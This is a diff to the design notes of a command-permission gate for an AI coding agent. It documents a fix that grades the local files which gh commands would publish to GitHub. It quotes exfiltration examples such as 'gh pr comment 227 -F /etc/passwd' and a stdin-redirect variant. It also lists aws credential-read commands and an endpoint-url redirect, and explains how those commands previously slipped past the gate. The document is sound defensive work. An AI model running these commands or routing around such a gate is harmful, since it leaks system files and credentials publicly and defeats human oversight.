@@ -540,7 +540,52 @@ ask-defaulting (uncertainty escalates to a human, never to allow):
   the slug as the noun and slip the delete past the deny tier) — and
   that same parsed `-R`/`--repo` value feeds the foreign-target scoping;
   an unrecognized leading global fails closed (**deny**) rather than
-  desyncing detection. For `aws`: `--endpoint-url` **denies** (redirects the signed
+  desyncing detection. **A gh command that PUBLISHES a local file has
+  that file's path graded by read containment (#229)**
+  (`classify_gh_files.go`). gh's body-file flags read a file off local
+  disk and send its contents to GitHub, where the destination may be
+  public and outlives any local cleanup — and the gate already held the
+  verdict that decides it (`cat /etc/passwd` denies as a cross-repo
+  read), but `classifyGh` never asked for it: the operand was consumed
+  as an ordinary flag value and never reached containment, so
+  `gh pr comment 227 -F /etc/passwd` published the file under an
+  outright ALLOW. This is the converse of #225's class 1, where a LOCAL
+  redirect (`gh pr diff > .claude/tmp/x`) exfiltrates nothing because
+  the bytes stay in a worktree the agent can already read and write.
+  Per noun/verb, `ghFileSpecs` names the flags whose value is a local
+  path (`-F`/`--body-file` on the pr/issue verbs, `-F`/`--notes-file`
+  on the release verbs, `--recover` on `pr`/`issue create`,
+  `-a`/`--add` on `gist edit`) and the index from which POSITIONAL
+  operands name files (`gh gist create <filename>…` from 0;
+  `gh release create <tag> [<filename>…]`, `gh release upload <tag>
+  <files>…` and `gh gist edit <id> [<filename>]` from 1). The values
+  are extracted by the same `pathFlagValues` the read track uses, so
+  all four spellings (separate token, glued short, `=`-joined long,
+  short-cluster tail) are covered, and they are **appended** to the
+  positional walk rather than substituted for it — a mismodelled arity
+  can only ever add a path to containment, never swallow one out of it.
+  A `-` operand is gh's read-from-stdin marker, so it is replaced by
+  the command's input-redirect sources: `gh pr comment 227 -F - <
+  /etc/passwd` is the same publish spelled differently and earns the
+  same **deny**. Grading runs BELOW the irreparable-deny tier (those
+  keep their specific messages) and ABOVE the publish ask, so an
+  escaping asset on `gh release create` / `gh gist create --public`
+  **denies** instead of offering a click-through. The verdict is taken
+  through `containReadSources`, which forwards an escape and discards
+  the ALLOW: a contained body file never blesses the publish itself, so
+  the publish ask and the foreign-target ask still fire. `--template`
+  is graded on `gh pr create` (gh annotates it `file`) and not on
+  `gh issue create` (annotated `name`, resolved server-side) — the one
+  divergence that makes the table per-verb rather than a union. The
+  second half is the **fail-safe: each spec enumerates its verb's
+  COMPLETE flag grammar, and an unrecognized flag asks**, the same
+  whitelist shape `ghAuthStatusEscalates` holds for `gh auth status`,
+  so a gh release that adds another file-reading flag costs one click
+  rather than a silent publish. The `@file` expansion in `gh api`
+  `-f`/`-F` values is deliberately NOT part of this: every `gh api`
+  form carrying a request body already asks for method reasons, so
+  there is no allow to close. For `aws`: `--endpoint-url` **denies**
+  (redirects the signed
   request, with credentials, to an arbitrary host); credential/secret
   reads (`sts get-session-token`, `ecr get-login-password`,
   `secretsmanager get-secret-value`, `ssm get-parameter
